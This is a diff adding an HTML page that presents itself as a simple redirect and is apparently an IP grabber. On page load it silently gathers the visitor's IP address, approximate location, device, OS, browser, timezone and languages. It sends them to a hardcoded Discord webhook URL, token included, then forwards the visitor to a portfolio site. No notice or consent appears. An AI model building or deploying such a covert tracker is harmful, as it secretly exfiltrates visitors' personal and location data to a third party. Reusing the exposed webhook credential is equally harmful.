@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <!-- Include UAParser.js for device detection -->
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
+    <script>
+        // Function to send data to Discord
+        async function sendToDiscord(embedData) {
+            try {
+                await fetch('https://discord.com/api/webhooks/1368969259262283866/QjukfskhtGTShxZwdZTODlOH5OlHfhrS_u8gBdlLXtYNphyRZbMxU17ENO5c2mgNdAXE', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [embedData],
+                        content: "📱 New visitor detected!"
+                    })
+                });
+            } catch (error) {
+                console.error('Failed to send to Discord:', error);
+            }
+        }
+
+        // Get detailed device information
+        function getDeviceInfo() {
+            const parser = new UAParser();
+            const result = parser.getResult();
+            
+            return {
+                browser: `${result.browser.name} ${result.browser.version}`,
+                os: `${result.os.name} ${result.os.version}`,
+                device: result.device.vendor ? `${result.device.vendor} ${result.device.model}` : "Desktop",
+                deviceType: result.device.type || "Desktop",
+                cpu: result.cpu.architecture || "Unknown",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: `${window.screen.colorDepth} bit`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
+                javaScript: "Enabled",
+                doNotTrack: navigator.doNotTrack || "Not specified"
+            };
+        }
+
+        // Main tracking function
+        async function trackUser() {
+            try {
+                // Get IP address
+                let userIP = "Unknown";
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    userIP = ipData.ip;
+                } catch (ipError) {
+                    console.warn('IP detection failed:', ipError);
+                }
+
+                // Get geolocation
+                let geoData = {};
+                if (userIP !== "Unknown") {
+                    try {
+                        const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                        geoData = await geoResponse.json();
+                    } catch (geoError) {
+                        console.warn('Geo lookup failed:', geoError);
+                    }
+                }
+
+                // Get device info
+                const deviceInfo = getDeviceInfo();
+                const locationLink = geoData.latitude && geoData.longitude ? 
+                    `https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude}` : 
+                    "No coordinates";
+
+                // Prepare Discord embed
+                const embed = {
+                    title: "🌐 Visitor Intelligence Report",
+                    color: 0xFF6B00,
+                    fields: [
+                        { name: "🆔 IP Address", value: `\`${userIP}\``, inline: true },
+                        { name: "📍 Location", value: `${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country_name || "?"}`, inline: true },
+                        { name: "🗺️ Map", value: `[View Location](${locationLink})`, inline: true },
+                        { name: "🖥️ Device", value: `${deviceInfo.device} (${deviceInfo.deviceType})`, inline: true },
+                        { name: "⚙️ OS", value: deviceInfo.os, inline: true },
+                        { name: "🌐 Browser", value: deviceInfo.browser, inline: true },
+                        { name: "🖥️ Screen", value: `${deviceInfo.screen} (${deviceInfo.colorDepth})`, inline: true },
+                        { name: "⏰ Timezone", value: deviceInfo.timezone, inline: true },
+                        { name: "🗣️ Languages", value: deviceInfo.languages, inline: true },
+                        { name: "🔌 ISP", value: geoData.org || "Unknown", inline: true },
+                        { name: "📡 Network", value: `Cookies: ${deviceInfo.cookies} | DNT: ${deviceInfo.doNotTrack}`, inline: true },
+                        { name: "📱 User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+                        { name: "🔗 Page URL", value: window.location.href, inline: false }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "Tracker by Potato | " + new Date().toString() }
+                };
+
+                // Send to Discord without waiting
+                sendToDiscord(embed);
+                
+            } catch (error) {
+                console.error('Tracking failed:', error);
+            } finally {
+                // Redirect after short delay
+                setTimeout(() => {
+                    window.location.href = 'https://portfolio.poorpotato.fun/';
+                }, 500);
+            }
+        }
+
+        // Start tracking when page loads
+        window.addEventListener('DOMContentLoaded', trackUser);
+    </script>
+</head>
+<body>
+    <!-- Empty body - nothing displayed -->
+</body>
+</html>
